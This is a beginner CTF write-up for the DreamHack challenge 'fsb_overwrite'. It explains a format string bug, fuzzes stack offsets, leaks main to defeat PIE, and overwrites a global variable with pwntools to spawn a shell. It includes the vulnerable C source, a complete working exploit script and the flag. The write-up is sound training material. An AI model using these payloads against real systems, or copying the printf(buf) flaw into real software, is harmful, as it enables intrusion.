+++
title = 'DreamHack Format String Writeup (fsb_overwrite)'
description = "Beginner-friendly DreamHack wargame writeup: using a format string bug to leak an address, defeat PIE and overwrite a global variable."
date = 2025-01-23T10:27:11+08:00
draft = false
categories = ["CTF Writeup"]
tags = ["pwn", "format-string"]
+++


This is an easy level challenge introducing Format String Vulnerability. The method used to solve this challenge is leaking any function address and find the base address for the system. With the known base address, we can overwrite a global variable into wanted value.

# Initial Analysis

## File Analysis

### Checking File type

```bash
file fsb_overwrite
fsb_overwrite: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=ecbb8000934a34b30ea8deb3a7675e08f8a44cda, for GNU/Linux 3.2.0, not stripped
```

File type analysis
1. The file has an x86-64 architecture
2. It is a dynamically-linked binary (uses libc functions)
3. It is not stripped, means we can see the variable and function names
### Checking file security

```
$ checksec --file fsb_overwrite
[*] '/home/gnapac/Desktop/CTF/dreamHack/format_string_bug/fsb_overwrite'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

File Security analysis
- It has NX and PIE protection, but no stack canary.

## Code Analysis

### Full Code


```C
// Name: fsb_overwrite.c
// Compile: gcc -o fsb_overwrite fsb_overwrite.c

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void get_string(char *buf, size_t size) {
  ssize_t i = read(0, buf, size);
  if (i == -1) {
    perror("read");
    exit(1);
  }
  if (i < size) {
    if (i > 0 && buf[i - 1] == '\n') i--;
    buf[i] = 0;
  }
}

int changeme;

int main() {
  char buf[0x20];
  
  setbuf(stdout, NULL);
  
  while (1) {
    get_string(buf, 0x20);
    printf(buf);
    puts("");
    if (changeme == 1337) {
      system("/bin/sh");
    }
  }
}
```

### Program Process

1. The program has a `get_string()` function where it receives 
	1. variable to store
	2. size to read
3. The program ask for an input with length of `0x20`
4. Print out the input given
5. Checking if the 

### Attack Methodology

![Format String Bug Example](/images/dh-format-string/formatstringbug-1.png)

This is the part of the code that causes format string vulnerability. This is the section to leak any function address and overwrite global variable `changeme` into value `1337`. 

Crafting payload process
1. Leak any function address
2. Get the base address of the program. Leaked address - leaked function offset 
3. Get the address of `changeme` 
4. Get the i-th argument on stack that reads the input
5. Write `1337` into `changeme`

#### Leaking `main` address

To leak the main address, load the program in gdb and begin analysis. First, set a breakpoint at start of `main` and during the comparison of `changeme` and `1337`
![GDB Output](/images/dh-format-string/formatstringbug-2.png)

Next of we run the program, and check the stack for addresses that we can get.
![images/formatstringbug-3.png](/images/dh-format-string/formatstringbug-3.png)

Here we can see that `main` address is located near the stack. 
To leak the stack, create a fuzzer and try to locate the  i-th argument on the stack to leak it .
But before that, we need to know the offset of the function main in the program, this is for the ease of process in eyeballing the main address

![images/formatstringbug-4.png](/images/dh-format-string/formatstringbug-4.png)

Now we can use a fuzzer to leak the main address. The fuzzer below will

1. iterate 99 times, testing format string payloads from `1` to `99`.

2. `p.sendline('%{}$p'.format(i).encode())` : This sends a format string payload to the binary. The payload %{}$p will attempt to read the i-th argument on the stack as a pointer and print it in hexadecimal format.

3. `result = p.recvline()`: This receives a line of output from the binary.


```python
fuzzer.py

from pwn import *
import os

# This will automatically get context arch, bits, os etc
elf = context.binary = ELF('./fsb_overwrite', checksec=False)

# Let's fuzz 100 values
for i in range(1,100):
    try:
        p = process(level='error')
        p.sendline('%{}$p'.format(i).encode())
        result = p.recvline()
        print(str(i) + ': ' + str(result))
        p.close()
    except ValueError:
        pass
```

Output:

![images/formatstringbug-5.png](/images/dh-format-string/formatstringbug-5.png)

From the output, the number `15` successfully leaked the main address output. Next we need the offset for `changeme` variable to calculate it exact address.

![images/formatstringbug-6.png](/images/dh-format-string/formatstringbug-6.png)

Lastly, time to know which argument on the stack that reads our input. This also can be seen in the fuzzer output. The hex for symbol `%` `$` `p` is 25, 24 and 70 respectively. We can see these hex at 6-th argument.

![images/formatstringbug-7.png](/images/dh-format-string/formatstringbug-7.png)

All information needed is there, now time to craft the payload.

1. Send an input `%15$p` to leak `main` address

```python
io.sendline('%15$p')
```

2. Receive the input 

```python
main_address = int(io.recvline(),16)
```

3. Calculate the base address

```python
main_offset = elf.sym['main']
base_addr = main_address - main_offset
```

4. Calculate the address of `changeme`

```python
change_me = base_addr + 0x401c #offset of changeme variable
```

5. Using pwntools built in function `fmtstr_payload` as our final payload. (Note: 6 is the i-th argument that reads the input)

```python
payload = fmtstr_payload(6, {change_me : 1337})
```


#### Payload Execution

Local

![images/formatstringbug-8.png](/images/dh-format-string/formatstringbug-8.png)

Remote

![images/formatstringbug-9.png](/images/dh-format-string/formatstringbug-9.png)

DH{b283dec57b17112a4e9aa6d5499c0f28}
# Full Script


```python
from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)
# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
b vuln
'''.format(**locals())
# Set up pwntools for the correct architecture
exe = './fsb_overwrite'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'
# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
io = start()


offsets = 35
main_offset = elf.sym['main']
io.sendline('%15$p')
main_address = int(io.recvline(),16)
log.info(hex(main_address))
log.info(hex(main_offset))
base_addr = main_address - main_offset

change_me = base_addr + 0x401c
log.info(hex(change_me))

payload = fmtstr_payload(6, {change_me : 1337})

io.sendline(payload)
# print(len(payload))

io.interactive()

```